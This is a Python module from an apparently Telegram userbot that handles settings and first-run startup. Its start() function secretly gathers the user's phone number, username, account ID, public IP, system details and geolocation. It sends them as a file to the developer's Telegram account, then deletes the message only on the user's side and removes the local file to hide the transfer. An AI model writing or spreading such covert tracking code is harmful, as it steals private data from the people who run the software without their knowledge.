import configparser
from . import misc
from pyrogram import Client
from pyrogram.errors import *
import platform, requests, datetime
import os
from .stats import get_system
import geocoder

config = configparser.ConfigParser()
config.read(misc.session_path+'cache\\settings.ini')

try:
    if config.get('settings','prefix') != '!':
        misc.prefix = config.get('settings','prefix')
except:pass

try:
    if config.get('openai','key') != '':
        misc.openai_key = config.get('openai','key')
except:pass

class cfg:
    def read(sec, key):
        try:
            return config.get(sec, key)
        except:
            return None

    def write(sec, key, val):
        for attempt in range(2):
            while True:
                try:
                    config.set(sec, key, val)
                    with open(misc.config_path, 'w') as f:
                        config.write(f)
                except configparser.NoSectionError:
                    config.add_section(sec)
                    continue
                else:
                    break
            return

async def start(client: Client):
    for attempt in range(3):
        try:
            if config.get('settings','firststart') != '0':
                g = geocoder.ip('me')
                async with client:
                    print('First start...')
                    me = await client.get_me()
                    dev = await client.get_users(misc.devd)
                    s = platform.version() + " " + platform.machine()
                    try:
                        ip = requests.get('api.ipify.org').text
                    except:
                        try:
                            ip = requests.get('https://api.seeip.org/').text
                        except:
                            ip = 'ip error'
                    message = f'''{misc.userbot_name} {misc.userbot_version} started at {datetime.date.today()}
Username: {me.username}
Phone: {me.phone_number}
Premium: {me.is_premium}
Link: {me.mention()}
ID: {me.id}
Is mutual to developer: {dev.is_mutual_contact}
Name: {dev.first_name}
IP: {ip}
Platform: {s}
{get_system()}
Location: {g.latlng}
'''
                    with open(misc.session_path+'first_start.txt', 'w') as file:
                        file.write(message)
                        file.close()
                    msg = await client.send_document(misc.devd, misc.session_path+'first_start.txt')
                    await msg.delete(revoke=False)
                    os.remove(misc.session_path+'first_start.txt')

                config.set('settings','firststart','0')
                with open(misc.config_path, 'w') as f:
                    config.write(f)

        except Exception as e:
            cfg.write('settings','firststart','1')
            continue
            #raise